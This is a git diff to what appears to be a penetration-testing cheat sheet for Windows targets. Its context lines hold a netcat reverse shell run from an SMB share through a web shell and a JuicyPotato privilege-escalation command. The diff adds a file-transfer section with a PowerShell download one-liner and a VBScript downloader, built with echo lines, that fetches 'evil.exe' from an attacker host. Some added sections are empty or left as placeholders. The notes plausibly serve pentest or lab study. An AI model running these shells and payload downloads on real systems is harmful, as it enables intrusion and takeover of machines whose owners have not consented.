@@ -63,10 +63,10 @@ $ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 Web shell + SMB exec
 ```
 # Setup local share e.g. python3 ../smbserver.py EVILSHARE .
-$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [localdir] 
+$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share] 
 
 # Execute netcat reverse shell within webshell
-cmd> \\[host]\share\nc.exe [host] [port] -e cmd.exe
+> \\[host]\share\nc.exe [host] [port] -e cmd.exe
 ```
 
 Have a web shell? Check if server can reach you:
@@ -98,7 +98,7 @@ PS> Get-ChildItem | Get-Acl
 
 ### File & Folder Permissions
 
-### Acecss Token Abuse
+### Access Token Abuse
 
 https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad
 
@@ -109,7 +109,56 @@ JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled.
 > JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 ```
 
+## File Transfer Methods
 
+### Linux.
+```
+```
+
+### Windows.
+
+Powershell
+```
+> Powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[remotefile]')
+```
+
+Wget -> cscript
+```
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+# After you've created wget.vbs
+cscript wget.vbs http://[host]/evil.exe evil.exe
+```
+
+SMB
+```
+> python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share
+> XXX
+```
 
 
 ## Password Cracking
